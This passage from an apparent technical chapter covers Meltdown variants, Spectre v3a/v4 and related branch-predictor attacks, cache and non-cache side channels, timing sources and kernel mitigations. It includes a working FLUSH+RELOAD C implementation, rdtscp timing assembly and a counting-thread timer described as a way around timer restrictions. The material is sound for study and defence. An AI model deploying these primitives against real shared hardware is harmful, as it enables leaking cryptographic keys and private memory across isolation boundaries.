This PoC uses `SIGSEGV` + `longjmp` for exception suppression. An alternative (TSX-based) approach uses Intel TSX (`XBEGIN`/`XEND`) to suppress the fault without signals, yielding higher read throughput. TSX-based Meltdown achieves ~500 KB/s read rates on Skylake; the signal-based approach is limited to ~10 KB/s due to signal delivery overhead.

### 4.3 KPTI (Kernel Page Table Isolation)

Covered in Domain 2, Chapter 2A §10.3. KPTI maintains separate user and kernel page tables. In user mode, the kernel's pages are not mapped (except for a minimal trampoline containing the entry/exit code and the interrupt descriptor table), so the speculative load cannot access kernel memory — the page table walk fails even speculatively. On kernel entry, the CPU switches to the kernel page table (via CR3 write); on kernel exit, it switches back to the user page table.

**PCID optimization.** Without PCID (Process-Context Identifier), the CR3 switch on every kernel entry/exit flushes the entire TLB, costing 400-1000 cycles of TLB refill. PCID assigns different identifiers to the user and kernel page tables, allowing both to coexist in the TLB. The CR3 switch sets a flag to indicate "do not flush TLB entries with the new PCID." This reduces the KPTI overhead from ~30% on syscall-heavy workloads (without PCID) to ~5% (with PCID). PCID is available on Intel CPUs from Westmere onward and AMD CPUs from Zen onward.

**Performance impact.** KPTI overhead depends heavily on workload. Syscall-heavy applications (databases, web servers performing many small I/O operations) see 5-30% overhead. Compute-heavy workloads with few syscalls see <1% overhead. The Redis benchmark showed ~7% throughput loss; PostgreSQL showed ~17% on OLTP workloads; kernel compilation showed ~5% wall-time increase.

### 4.4 Meltdown variant taxonomy (Canella et al. 2019)

The "Transient Execution Attacks" systematization paper (Canella et al., CCS 2019) classified Meltdown-type attacks into a taxonomy based on which exception type is suppressed:

- **Meltdown-US (User/Supervisor).** The original Meltdown: speculatively reading a supervisor-only page from user mode. Exploits the US bit (User/Supervisor) in the page table entry. Affects Intel pre-Whiskey Lake, ARM Cortex-A75.
- **Meltdown-P (Present bit).** Speculatively reading from a page marked not-present (P bit = 0). This is the basis of **L1 Terminal Fault / Foreshadow** (CVE-2018-3615, -3620, -3646): the speculative load resolves the physical address from the PTE's physical-address field even when the present bit is clear, accessing stale data in the L1 cache at that physical address. Covered in detail in Chapter 7B §1 (SGX/Foreshadow).
- **Meltdown-GP (General Protection).** Speculatively reading from a non-canonical address or accessing a segment-protected region, transiently using the loaded value before the #GP fault retires. Demonstrated on some Intel CPUs; the practical impact is limited because the canonical-address check is typically enforced early in the pipeline.
- **Meltdown-NM (Device Not Available).** Speculatively reading FPU/SSE/AVX registers when the CR0.TS bit indicates the FPU state is not available (lazy FPU context switching). The speculative load reads stale FPU state from a different process. Mitigated by eager FPU context switching (Linux switched to eager by default in 4.6, eliminating this vector).
- **Meltdown-BR (Bounds check).** Speculatively executing past a `BOUND` instruction that would raise #BR. The speculative window between the bounds check and the exception can be exploited to read out-of-bounds data. `BOUND` is rarely used in modern code (deprecated in 64-bit mode), so the practical impact is minimal.
- **Meltdown-PK (Protection Key).** On CPUs supporting Memory Protection Keys (PKU), a load from a page whose protection key forbids user-mode read access may transiently return the data before the PKRU check retires. Canella et al. demonstrated this on Skylake: even when the PKRU register disables read access for a protection key, the speculative load still succeeds and the data can be transmitted via a cache side channel. Mitigated by microcode that enforces PKRU checks before forwarding the speculative value.

The Canella et al. taxonomy is significant because it reveals that Meltdown is not a single bug but a class of bugs: any permission check that is deferred past the speculative-load dispatch can be exploited. Each variant requires a different mitigation strategy, and new variants continue to be discovered as researchers probe additional exception-generating conditions in the CPU pipeline.

### 4.5 Affected processors

**Vulnerable:** Intel Core from Nehalem through Coffee Lake Refresh (i.e., all pre-Ice Lake desktop/laptop/server CPUs). ARM Cortex-A75 (used in Snapdragon 845, 855). IBM POWER7, POWER8, POWER9 (partially).

**Not vulnerable:** AMD — all AMD processors enforce a speculative permission check on loads, zeroing the forwarded value if the permission check fails. Intel Ice Lake and later — the speculative load returns zero when the permission check fails (an in-silicon Meltdown fix). ARM Cortex-A53, A55, A72, A73, A76 and later — not affected by Meltdown-US (though some are vulnerable to Meltdown-P/Foreshadow).

---

## 5. Spectre v3a and v4

### 5.1 v3a — Rogue system register read (CVE-2018-3640)

A variant where speculative execution reads system registers (MSRs, control registers) that should be inaccessible from the current privilege level. The speculative read obtains the register value and can encode it into cache state before the privilege violation is detected. Mitigated by microcode updates that prevent speculative reads of restricted system registers by returning zero or the previously-loaded value for speculative accesses that violate privilege constraints.

### 5.2 v4 — Speculative Store Bypass (CVE-2018-3639)

When a load follows a store to the same address, the CPU's memory disambiguation unit predicts whether the load aliases with the store. Speculative Store Bypass (SSB) occurs when the CPU incorrectly predicts that a load does NOT alias with a preceding store, speculatively reads a stale value (from an earlier store or from the cache), and uses that stale value in dependent operations.

The mechanism at the micro-op level:

1. A store micro-op writes value V_new to address A. The store is placed in the store buffer but has not yet committed to the cache.
2. A subsequent load micro-op reads address A. The memory disambiguator checks if any pending store in the store buffer targets address A.
3. If the disambiguator predicts "no alias" (incorrectly), the load bypasses the store buffer and reads the stale value V_old from the cache.
4. Dependent micro-ops use V_old speculatively.
5. When the store address resolves and the disambiguator detects the alias, the speculative execution is squashed — but the microarchitectural side effects of instructions using V_old persist.

An attacker can exploit this if the stale value is a security-sensitive pointer or index: the speculative execution uses the stale (attacker-influenced) value, accessing memory at an attacker-chosen location. The attack is relevant in sandboxed environments (JIT compilers, eBPF, WebAssembly) where the attacker can construct code that places a store and a load at the same address with a specific stale-value pattern.

**Mitigations.**

**SSBD (Speculative Store Bypass Disable).** A microcode feature that disables speculative store bypass when set (MSR `IA32_SPEC_CTRL` bit 2). When SSBD is active, loads always wait for preceding stores to the same address to resolve, eliminating the speculative bypass. Performance cost: 2-8% overhead on workloads that rely on store-to-load forwarding throughput (the load-to-use latency increases by ~20 cycles when the store address resolution is delayed).

**`prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_STORE_BYPASS, ...)`:** Per-process control of SSBD. `PR_SPEC_FORCE_DISABLE` enables SSBD for the calling process; `PR_SPEC_DISABLE` sets it as a preference. This allows the kernel to enable SSBD selectively for untrusted processes (sandboxed browsers, containers) while leaving it off for trusted workloads.

**`spec_store_bypass_disable` kernel parameter:** Global control (`on`, `off`, `auto`, `prctl`, `seccomp`). The `seccomp` setting automatically enables SSBD for processes under seccomp filters (the assumption being that sandboxed processes are less trusted and more likely to be exploited). The `auto` setting enables SSBD only for processes that explicitly request it via `prctl`.

**Compiler mitigation: Speculative Load Hardening (SLH).** Clang's SLH can mitigate SSB by ensuring that load values are masked based on the resolved store state, though the primary SLH target is Spectre v1. For SSB specifically, SSBD is the standard mitigation.

**SSB in JIT and sandbox contexts.** The SSB attack is most dangerous in JIT-compiled or sandboxed environments where the attacker controls the code being compiled. In the eBPF context, an attacker can construct a program that writes to a stack variable and immediately reads it; if the JIT compiler places the store and load close enough that the disambiguator may mispredict, the load reads stale data from the stack (potentially from a previous eBPF program's context or from the kernel stack frame). The eBPF verifier mitigates this by inserting `SSBD`-enabling `prctl` calls for unprivileged programs and by placing `lfence` barriers between stores and loads to the same stack offset when the verifier detects potential SSB gadgets. WebAssembly runtimes face analogous risks: Wasm code can create deliberate store/load aliasing patterns. Chrome's V8 Wasm compiler inserts memory fences at compilation boundaries to prevent SSB exploitation from Wasm.

---

## 6. Spectre-BTB, Spectre-RSB, Spectre-STL, Spectre-PHT

### 6.1 Spectre-BTB

A refinement of Spectre v2: the attacker specifically targets the BTB (Branch Target Buffer), which caches the targets of indirect branches. By executing an indirect branch at the same virtual address as the victim's branch (in a different address space, relying on aliasing in the BTB's indexing), the attacker trains the BTB to predict the victim's branch to the attacker's chosen target. Mitigated by IBRS, IBPB, eIBRS, and retpoline. See §3.2 for the full BTB poisoning mechanism.

### 6.2 Spectre-RSB

The RSB (Return Stack Buffer) predicts `ret` targets based on the corresponding `call` stack. If the RSB underflows (more `ret`s than `call`s — e.g., when deep recursion exhausts the RSB entries and the CPU falls back to the BTB for prediction), the CPU may use the BTB instead, which can be attacker-trained.

**RSB stuffing.** The mitigation: on context switches and VM exits, the kernel fills the RSB with safe entries (typically the `lfence; jmp` speculation trap), so that any RSB underflow during the new context speculates into the trap. The kernel macro `FILL_RETURN_BUFFER` (or `RSB_CLEAR_LOOPS`) performs this stuffing.

On CPUs with eIBRS, RSB-based misprediction is less of a concern because the enhanced indirect-branch restrictions also cover return prediction. However, RSB stuffing remains as defense-in-depth. See §3.5 for the full SpectreRSB analysis.

### 6.3 Spectre-STL

Speculative store-to-load forwarding (a variant related to v4): the CPU speculatively forwards a store's value to a subsequent load at the same address, even when the store has not yet committed. If the forwarded value is from a different security domain (e.g., the attacker wrote a value that the victim speculatively loads), it can influence the victim's speculative execution. Mitigated by SSBD.

The Spectre-STL distinction from v4 (SSB) is subtle: SSB occurs when the CPU incorrectly predicts that a load does NOT alias with a pending store (the load bypasses the store buffer entirely and reads stale data from cache). STL occurs when the CPU correctly identifies the alias but speculatively forwards the store's value before the store is committed and validated — in a scenario where the forwarded value comes from an untrusted source. The practical exploitation and mitigation (SSBD) are the same, but the microarchitectural root cause differs.

### 6.4 Spectre-PHT

The PHT (Pattern History Table) records the history of conditional branch outcomes. Spectre-PHT targets the PHT specifically: the attacker trains the PHT from one context to influence conditional branch prediction in another context. This is the formalized version of Spectre v1 — v1 is a specific instance of PHT-based misprediction. Mitigated by `lfence` serialization and `array_index_mask_nospec`.

The PHT is indexed by a combination of the branch's instruction address and the global branch history (from the BHB). This means PHT aliasing can occur between branches at different addresses if their (address XOR history) hash values collide. The attacker can exploit this cross-address aliasing: by executing a specific sequence of branches that sets the BHB to a particular state, the attacker can train a PHT entry that will be consulted by a victim branch at a completely different address. This makes PHT-based attacks more flexible than BTB-based attacks, which primarily rely on address aliasing.

The formal model (Mcilroy et al., "Spectre is here to stay," 2019) shows that any conditional branch in a privileged context that guards a security-relevant operation is potentially a Spectre-PHT gadget if: (a) the branch condition depends on attacker-influenced data, (b) the speculative path accesses data that the attacker should not be able to read, and (c) a transmission gadget exists to encode the accessed data into observable microarchitectural state. The sheer number of conditional branches in any kernel codebase (hundreds of thousands) makes comprehensive mitigation extremely difficult — this is the fundamental reason that Spectre v1 remains a persistent, unsolved problem from a pure-software perspective.

---

## 7. Cache-based side channels

The cache hierarchy is the most commonly exploited microarchitectural side channel because cache accesses are fast and cache misses are slow — a timing difference of 3-10 ns vs 100-300 ns that is easily measurable.

### 7.1 FLUSH+RELOAD

The attacker and victim share memory (typically a shared library like libc, which is `MAP_PRIVATE` but physically shared until COW, or a memory-mapped file using `MAP_SHARED`). The attacker:

1. **Flushes** a cache line containing a target address from all cache levels using `clflush`.
2. Waits for the victim to execute.
3. **Reloads** the same address and measures the access time. If the victim accessed the address (bringing it into cache), the reload is fast (cache hit). If not, it is slow (cache miss).

This reveals which cache lines the victim accessed — and thus which code or data paths the victim executed. FLUSH+RELOAD is the side channel used in most Spectre proof-of-concepts to extract the secret encoded in cache state.

**Complete FLUSH+RELOAD implementation:**

```c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#define CACHE_HIT_THRESHOLD 100  /* cycles; tune per microarchitecture */

/* Flush a cache line */
static inline void flush(void *addr) {
    _mm_clflush(addr);
    _mm_mfence();
}

/* Measure reload time for a single address */
static inline uint64_t reload_time(void *addr) {
    unsigned int junk;
    uint64_t t0 = __rdtscp(&junk);
    asm volatile("" ::: "memory");
    (void)*(volatile uint8_t *)addr;
    uint64_t t1 = __rdtscp(&junk);
    return t1 - t0;
}

/* Determine if addr was accessed by victim since last flush */
int probe(void *addr) {
    uint64_t t = reload_time(addr);
    return (t < CACHE_HIT_THRESHOLD) ? 1 : 0;  /* 1 = cache hit = victim accessed */
}

/* Example: monitor 256 cache lines to determine which byte value
   was used as an index by the victim (Spectre side channel recovery) */
void recover_byte(uint8_t *probe_array, int stride, int *results) {
    for (int i = 0; i < 256; i++) {
        void *addr = &probe_array[i * stride];
        uint64_t t = reload_time(addr);
        if (t < CACHE_HIT_THRESHOLD)
            results[i]++;
    }
}
```

**`clflush`** is an unprivileged instruction on x86. It evicts the specified cache line from all cache levels. `clflushopt` is an optimized version that allows out-of-order execution of multiple flushes. `clwb` (Cache Line Write Back) writes back a dirty cache line but retains it in cache — less useful for FLUSH+RELOAD but relevant for persistent-memory applications.

### 7.2 PRIME+PROBE

Does not require shared memory. The attacker:

1. **Primes** a cache set by accessing enough cache lines to fill every way of the set with attacker-owned lines.
2. Waits for the victim to execute.
3. **Probes** the same cache set by re-accessing the primed lines and measuring timing. If the victim's access evicted one of the attacker's lines (because the victim's address maps to the same cache set), the attacker's re-access is slow (cache miss).

PRIME+PROBE works across process boundaries (no shared memory needed) and across VM boundaries (the L3 cache is typically shared between VMs on the same physical machine). It is noisier than FLUSH+RELOAD (cache-set aliasing is less precise than cache-line targeting) but more broadly applicable.

**Eviction set construction.** The critical challenge for PRIME+PROBE is constructing an eviction set: a set of addresses that all map to the same cache set as the target. On the LLC (Last Level Cache), this requires knowledge of the LLC slice-addressing function.

**Naive algorithm O(n^2).** Start with a large pool of addresses. For each candidate, test whether accessing the candidate followed by the target causes a cache miss (if yes, the candidate maps to the same set as the target). Repeat until enough conflicting addresses are found (equal to the LLC associativity, typically 12-20 ways). This requires O(n * W) probes where n is the pool size and W is the associativity.

**Group-testing algorithm O(n).** (Liu et al., S&P 2015.) Partition the candidate pool into groups. Test whether each group contains at least one address that conflicts with the target. Subdivide conflicting groups until individual conflicting addresses are isolated. The number of tests is O(n) because each test eliminates a group of candidates rather than a single one. In practice, this reduces eviction-set construction time from minutes to seconds on a modern LLC with 2048 sets and 16 ways.

**LLC slice hash reverse engineering.** Intel's LLC is physically divided into slices (one per core). The mapping from physical address to slice is determined by an undocumented hash function. Researchers (Maurice et al., DIMVA 2015; Irazoqui et al., 2015) reverse-engineered the slice hash for Sandy Bridge through Skylake by measuring LLC access latencies to known physical addresses (accesses to the local slice are faster than to a remote slice). The hash is a series of XOR operations on physical address bits. Knowing the hash is essential for PRIME+PROBE on the LLC: without it, the attacker cannot determine which slice a target address maps to and must prime all slices (increasing the noise and data volume by a factor equal to the number of cores).

For a 6-core Skylake CPU, the slice hash uses physical address bits 6, 10, 12, 14, 16, 17, 18, 20, 22, 24, 25, 26, 27, 28, 30, and 32+. The hash produces a 3-bit slice index (for 8 slices — 6 cores, but Intel rounds up to the next power of two). The reverse-engineering methodology: allocate a large physically-contiguous region (via `/proc/self/pagemap` to discover physical addresses or via huge pages), access addresses that differ only in the bits under test, and measure the LLC access latency from each core. Accesses to the local slice have ~40 cycle latency; remote slices add 10-20 cycles depending on the ring-bus hop count. By sweeping individual address bits and measuring the latency change, each bit's contribution to the slice hash can be determined.

On AMD Zen processors, the LLC is organized as a Victim Cache (the L3 does not include L1/L2 contents) and uses a different addressing scheme. The L3 slice (CCX or CCD) assignment is based on physical address bits that align with the CCX boundaries. AMD's scheme is simpler to reverse-engineer because the CCX assignment is coarser-grained (typically 2-4 CCXes per CCD).

### 7.3 EVICT+RELOAD

A variation of FLUSH+RELOAD that replaces `clflush` with cache eviction by accessing conflicting cache lines (useful when `clflush` is not available — some ARM processors lack a user-accessible cache-flush instruction). The attacker constructs an eviction set for the target cache line and accesses all lines in the eviction set to evict the target. Then proceeds with the reload-and-time step. EVICT+RELOAD is noisier than FLUSH+RELOAD because eviction is probabilistic (the replacement policy may not evict the target), but it is the only option on platforms without unprivileged cache-flush instructions. On ARM Cortex-A series processors (widely used in smartphones and tablets), EVICT+RELOAD is the standard cache-probing technique because the equivalent of `clflush` (the `DC CIVAC` instruction) requires EL1 privilege. The eviction set must account for the cache's pseudo-random or PLRU (pseudo-LRU) replacement policy, which makes single-attempt eviction unreliable; multiple rounds of eviction set traversal are used to increase the probability to near-certainty.

### 7.4 FLUSH+FLUSH

A covert-channel variant: the attacker measures the timing of `clflush` itself. `clflush` on a cache line that is present in cache takes different time than on a line that is absent (because the former must invalidate the line across all cache levels and coherence domains, while the latter is effectively a no-op). This provides the same information as FLUSH+RELOAD but with lower noise because the attacker never loads the target line (avoiding cache pollution). FLUSH+FLUSH achieves covert-channel bandwidths of ~490 KB/s with error rates below 0.5% (Gruss et al., DIMVA 2016).

### 7.5 Cache-based covert channels

Cache side channels can be repurposed as covert channels: two cooperating processes (a sender and a receiver) communicate by encoding data in cache state. The sender accesses (or does not access) specific cache lines to encode bits; the receiver probes those lines to decode them. Demonstrated covert-channel bandwidths:

| Method | Bandwidth | Error rate |
|--------|-----------|------------|
| FLUSH+RELOAD | ~600 KB/s | <1% |
| FLUSH+FLUSH | ~490 KB/s | <0.5% |
| PRIME+PROBE (LLC) | ~300 KB/s | ~3% |
| PRIME+PROBE (L1) | ~1.5 MB/s | <1% (same-core) |

Error correction (repetition coding, Hamming codes) reduces the effective bandwidth but pushes error rates below detectable thresholds. These covert channels cross VM boundaries, container boundaries, and (on SMT) thread boundaries.

Cache covert channels have been demonstrated in practical scenarios: Xu et al. (CCS 2015) showed that a malicious VM on Amazon EC2 could establish a PRIME+PROBE covert channel with a cooperating VM on the same physical host, transmitting data at hundreds of kilobits per second — sufficient for exfiltrating cryptographic keys or sensitive configuration data. The signal is robust enough to survive typical cloud-environment noise (competing workloads, OS scheduling jitter, DRAM refresh interference) when combined with error-correcting codes. The defense requires either cache partitioning (Intel CAT) or ensuring that mutually-untrusting workloads never share a physical machine (dedicated tenancy).

### 7.6 Cross-core vs same-core attacks

Same-core (SMT) attacks target L1/L2 caches, which are shared between hyper-threads. They achieve high bandwidth and low noise because the shared cache is small and the attacker can observe every access. Cross-core attacks must target the LLC (L3), which is shared across all cores. The LLC is larger (30-60 MB) and more noisy (other processes' accesses pollute the cache), reducing signal quality. Cross-core PRIME+PROBE requires careful eviction set construction and multiple measurements per bit to achieve reliable extraction.

### 7.7 Cache coherence protocols

Multi-socket and multi-core systems use cache coherence protocols (MESI, MESIF, MOESI) to maintain consistency across caches. The coherence traffic (snoop requests, invalidation messages, acknowledgments) introduces timing variations observable as side channels. When one core accesses a cache line, the coherence protocol may modify the line's state in another core's cache, and the state transition timing reveals the access pattern.

### 7.8 Huge-page cache attacks

Huge pages (2 MB or 1 GB) interact with the L1 data cache differently: the cache index bits come from a wider address range (because the page offset is larger), which changes the cache-set mapping. With huge pages, the attacker has more precise control over which cache set a target address maps to, improving the resolution of PRIME+PROBE and related attacks.

---

## 8. Non-cache side channels

### 8.1 TLB side channels (TLBleed)

On hyper-threaded CPUs, the two logical cores on the same physical core share the TLB (or share TLB sets via a partitioning scheme). A TLB access by one thread evicts a TLB entry belonging to the other thread (if they map to the same TLB set). By measuring TLB miss rates, an attacker on one hyper-thread can infer the victim's memory access pattern on the other hyper-thread.

TLBleed (Gras et al., 2018) demonstrated extraction of an EdDSA signing key from libgcrypt by observing TLB access patterns during the scalar multiplication. The attack achieved 98% key-bit recovery with a single-trace machine-learning classifier trained on TLB contention timing. Mitigation: disabling hyper-threading (`nosmt` kernel parameter), or core-scheduling (ensuring mutually-untrusting threads do not share a core, available since Linux 5.14 as `core-scheduling`).

### 8.2 Branch predictor side channels

The branch predictor state (PHT, BTB, RSB) is shared between hyper-threads and, on some CPUs, between privilege levels. An attacker can observe which branches the victim took by measuring the predictor's state.

**BranchScope** (Evtyushkin et al., ASPLOS 2018). Exploits the directional predictor (PHT) to determine the direction (taken/not-taken) of a specific victim branch. The attacker primes a PHT entry (by executing a branch that aliases with the victim's branch in the PHT), waits for the victim to execute, then probes the PHT entry by checking whether its own branch prediction changed. If the victim's branch outcome overwrote the PHT entry, the prediction for the attacker's branch changes detectably. BranchScope works across privilege levels and across hyper-threads, and was demonstrated extracting RSA key bits from a constant-time (but not branch-free) implementation.

**Spectre-PHT** (the formalized PHT attack) is the reverse direction: the attacker trains the PHT to influence the victim's branch prediction, causing the victim to speculatively execute the wrong path.

### 8.3 Port contention

Superscalar CPUs have multiple execution units (ALU ports, load ports, store ports, FP ports). On hyper-threaded cores, execution units are shared. If one thread occupies a specific port, the other thread's instructions targeting the same port are delayed. By measuring instruction latency, an attacker can infer which execution units the victim is using — and thus what type of instructions the victim is executing.

This side channel is fine-grained enough to distinguish individual instruction types (integer multiply vs. AES-NI vs. FP add vs. vector shuffle) and has been demonstrated for cryptographic key extraction. Aldaya et al. (CCS 2019) used port contention to extract a full ECDSA key from OpenSSL by monitoring usage of port 5 (which handles AES and vector operations) during the scalar multiplication. The attack required co-location on the same physical core (SMT sibling).

### 8.4 Prefetch side channels

The `prefetch` instruction (and its variants `prefetcht0`, `prefetcht1`, `prefetcht2`, `prefetchnta`) loads data into the cache hierarchy without causing a fault if the address is invalid. However, the timing of the `prefetch` instruction reveals whether the target address has a valid TLB entry: `prefetch` on a mapped address completes faster than on an unmapped address because the TLB hit/miss determines the instruction's latency.

This timing difference enables **KASLR bypass**: an attacker issues `prefetch` instructions targeting candidate kernel virtual addresses and measures the timing. Addresses within the kernel's mapped range complete faster (TLB hit or page-table walk succeeds) than addresses in unmapped regions (page-table walk fails). Gruss et al. (2016) demonstrated breaking KASLR in seconds using this technique, identifying the kernel's base address with 12-bit (4 KB) granularity. This prefetch-based KASLR bypass is one reason KPTI (which unmaps kernel pages from the user page table) also benefits KASLR defense, not just Meltdown mitigation.

### 8.5 Memory bus contention

On multi-socket systems, the memory bus (and the interconnect between sockets — Intel UPI, AMD Infinity Fabric) is a shared resource. One socket's memory traffic can delay another socket's accesses. By carefully timing memory accesses, an attacker can detect when the victim is generating high memory traffic (indicating specific computation phases). This channel is coarse-grained but has been demonstrated for detecting VM activity on co-located hosts.

The memory bus covert channel achieves lower bandwidth than cache-based channels (~100 KB/s) but operates across LLC partitions (Intel CAT/RDT cannot prevent it because the contention occurs at the memory controller, not the cache). Wu et al. (S&P 2014) demonstrated cross-VM memory bus contention on Amazon EC2, detecting co-located VMs and establishing a covert channel. The defense is memory bandwidth allocation (Intel Memory Bandwidth Allocation, MBA), which limits per-core memory bandwidth but is not universally deployed and reduces throughput for legitimate workloads.

### 8.6 Interrupt timing side channels

The delivery time of interrupts (hardware interrupts, inter-processor interrupts) is influenced by the CPU's current execution state. If the CPU is executing a long-latency instruction (e.g., `WBINVD`, a locked memory operation, or a page-table walk), interrupt delivery is delayed. An attacker who controls interrupt delivery timing (e.g., via a timer interrupt or an IPI from another core) can infer the victim's execution state. Van Bulck et al. (2017) used interrupt-timing side channels to extract SGX enclave secrets at instruction-level granularity.

The SGX interrupt-timing attack (SGX-Step) configures the APIC timer to fire at instruction-level granularity, single-stepping through enclave execution. Each interrupt causes an Asynchronous Enclave Exit (AEX), and the time between the interrupt firing and the AEX delivery reveals the latency of the instruction that was interrupted. By combining this with page-fault tracking (marking enclave pages not-present and observing which pages generate faults between single-steps), the attacker achieves instruction-level control-flow extraction — sufficient to recover secret-dependent branch outcomes even in constant-time implementations that lack data-dependent branches but have instruction-sequence-dependent timing.

### 8.8 DRAM-based side channels

The DRAM row buffer acts as a cache for the most recently accessed row within each bank. Accessing a different row in the same bank causes a row conflict (the current row must be closed and the new row opened), taking ~50 ns vs ~15 ns for a row-buffer hit. An attacker who shares a DRAM bank with the victim can detect the victim's row-access pattern by measuring row-conflict timing. Pessl et al. (2016) demonstrated cross-VM DRAM row-buffer side channels on DDR3 and DDR4, achieving ~2 KB/s covert-channel bandwidth. This channel bypasses all cache-level defenses (cache partitioning, cache flushing restrictions) because it operates at the DRAM level.

### 8.7 Timing sources

**`rdtsc` / `rdtscp`.** The Time Stamp Counter reads the CPU's cycle counter with sub-nanosecond resolution. `rdtsc` returns the counter in EDX:EAX but does not serialize — preceding instructions may not have completed. `rdtscp` is a serializing variant: it waits for all preceding instructions to complete before reading the counter, providing an accurate timestamp for the measured interval. The standard timing pattern:

```asm
; Measure access time to [addr]
mfence
rdtscp               ; serialize, read TSC into EDX:EAX
shl     rdx, 32
or      rax, rdx
mov     r8, rax       ; save start time
mov     al, [addr]    ; the access to measure
rdtscp               ; serialize, read TSC
shl     rdx, 32
or      rax, rdx
sub     rax, r8       ; delta = end - start
```

Kernel parameters can restrict `rdtsc`: `tsc=reliable` (trust the TSC), `tsc=unstable` (fall back to other timers). `prctl(PR_SET_TSC, PR_TSC_SIGSEGV)` can be used to make `rdtsc` deliver `SIGSEGV` rather than returning a value — disabling the high-resolution timer for sandboxed processes.

**Performance counters via `perf_event_open`.** The Linux `perf` subsystem exposes hardware performance counters including `PERF_COUNT_HW_CACHE_MISSES`, `PERF_COUNT_HW_CACHE_REFERENCES`, and the architecture-specific `cache-misses` event. An attacker process can open a performance counter for its own context and count cache misses during a probing window, providing an alternative to timing-based detection. The advantage is precision (exact miss count rather than timing); the disadvantage is the `perf_event_open` syscall overhead per measurement.

**ARM timing.** ARM processors provide `PMCCNTR_EL0` (Performance Monitor Cycle Counter) and `CNTVCT_EL0` (virtual counter). User-space access to `PMCCNTR_EL0` is controlled by `PMUSERENR_EL0` and is disabled by default on most ARM Linux kernels. `CNTVCT_EL0` is accessible but at lower resolution (typically the generic timer frequency, ~20 MHz, giving ~50 ns resolution — sufficient for FLUSH+RELOAD but marginal for fine-grained attacks). Some ARM SoCs expose higher-resolution counters through memory-mapped registers.

On Apple Silicon (M1/M2/M3/M4), the performance counters are accessible from EL0 via the `CNTPCT_EL0` register, which provides nanosecond-resolution timing. Apple has not disabled user-space access to this counter, making ARM-based Macs viable targets for cache-timing side channels. However, Apple's microarchitecture uses a non-standard cache hierarchy (large L1, shared L2 per performance/efficiency cluster) that affects the timing thresholds: FLUSH+RELOAD on M1 shows a hit/miss differential of ~30 cycles (vs ~100 cycles on Intel), requiring tighter thresholds and more samples for reliable discrimination.

**RISC-V timing.** RISC-V defines `cycle` and `time` CSRs (Control and Status Registers). User-mode access is controlled by the `mcounteren` and `scounteren` registers. When enabled, `rdcycle` provides cycle-accurate timing suitable for side-channel attacks. Most RISC-V Linux distributions enable user-mode `rdcycle` access by default, though the RISC-V specification notes that implementations may disable it for security reasons.

**Browser-based timers.** Before Spectre mitigations, browsers provided high-resolution timing via:

- **`performance.now()`:** Microsecond resolution. Post-Spectre, browsers reduced resolution to 5 microseconds (Chrome) or 1 millisecond (Firefox) and added jitter, making individual cache-hit/miss discrimination impossible.
- **SharedArrayBuffer counter thread.** An attacker creates a SharedArrayBuffer and starts a Web Worker that increments a counter in a tight loop. The main thread reads the counter before and after the timed operation, effectively creating a nanosecond-resolution timer. Post-Spectre, browsers disabled SharedArrayBuffer entirely (re-enabled later with Cross-Origin Isolation requirements: `Cross-Origin-Opener-Policy: same-origin` + `Cross-Origin-Embedder-Policy: require-corp`).
- **Timer-free alternatives.** Researchers demonstrated that explicit timers are not required: counting-based approaches use the number of operations a thread can complete during a victim's access as a proxy for time. Cache contention-based approaches measure the eviction rate of an attacker's data rather than access latency. These techniques are noisier but bypass all timer-resolution mitigations.

**AVX2/AVX-512 timing.** AVX-512 instructions cause frequency throttling on many Intel CPUs (the "AVX penalty"). A thread executing AVX-512 code runs at a lower frequency than one executing scalar code. An attacker on a co-located hyper-thread can detect whether the victim is using AVX-512 by measuring their own execution rate (which changes when the core's frequency changes). Additionally, AVX register state management has power-state transitions that introduce measurable timing differences.

**Constructing a counting-based timer (timer-free technique).** When all high-resolution timers are disabled or degraded, the attacker can create a relative timer by counting loop iterations:

```c
/* Thread 1 (counter thread): increment a shared counter in a tight loop */
volatile uint64_t shared_counter = 0;
void *counter_thread(void *arg) {
    while (1) shared_counter++;
    return NULL;
}

/* Thread 2 (attacker thread): use shared_counter as a timer */
uint64_t t0 = shared_counter;
/* ... perform timed operation (e.g., memory access) ... */
uint64_t delta = shared_counter - t0;
/* delta is proportional to elapsed time; calibrate against known latencies */
```

This counting-thread timer achieves resolution comparable to `rdtsc` (single-digit nanoseconds on a dedicated core) and is not affected by timer-resolution mitigations. The defense against counting-based timers is much harder: it requires either preventing the attacker from creating threads (impractical in general-purpose environments) or adding noise to all timing sources including thread scheduling (which degrades legitimate performance). This is why Spectre mitigations focus on preventing the speculative leak rather than eliminating the timing side channel.

Other timer-free approaches include: (1) **memory-contention timing**, where the attacker measures how many iterations of a memory-intensive loop complete during the victim's operation — contention on shared resources (cache, memory controller) reveals the victim's memory footprint; (2) **instruction-retirement counting**, using performance counters to count retired instructions as an indirect time measure; and (3) **network-based timing** (NetSpectre, Schwarz et al., ESORICS 2019), where the attacker measures network response latency from a remote machine, using the cache-state-dependent processing time as a side channel. NetSpectre is extremely slow (~1 bit per minute due to network jitter) but demonstrates that Spectre exploitation does not require local code execution.

---

## 9. Comprehensive mitigation landscape

### 9.1 Kernel mitigations summary

| Vulnerability | Primary mitigation | Scope | Performance cost |
|---|---|---|---|
| Spectre v1 (PHT) | `lfence`, `array_index_mask_nospec` | Per-gadget in kernel code | Low (~0.1-1% per patched path) |
| Spectre v2 (BTB) | Retpoline / eIBRS / IBRS+IBPB | Kernel-wide | Retpoline: 2-14%; eIBRS: <1% |
| Spectre-BHB | BHI_DIS_S / BHB clear sequence | Kernel entry | 1-3% on syscall-heavy |
| Meltdown (v3) | KPTI | Kernel-wide | 5-30% (syscall-heavy) |
| v3a | Microcode update | CPU-level | Negligible |
| v4 (SSB) | SSBD | Per-process or global | 2-8% (store-forwarding-heavy) |
| Spectre-RSB | RSB stuffing on context switch | Kernel-wide | Low (<1%) |
| FLUSH+RELOAD | No shared pages (impractical), noise | Application-level | N/A |
| PRIME+PROBE | Cache partitioning (CAT), noise | Platform-level | Variable |
| TLBleed | Disable SMT, core scheduling | Platform-level | Throughput loss (up to 30%) |
| Port contention | Disable SMT, core scheduling | Platform-level | Throughput loss |

### 9.2 Compiler mitigations

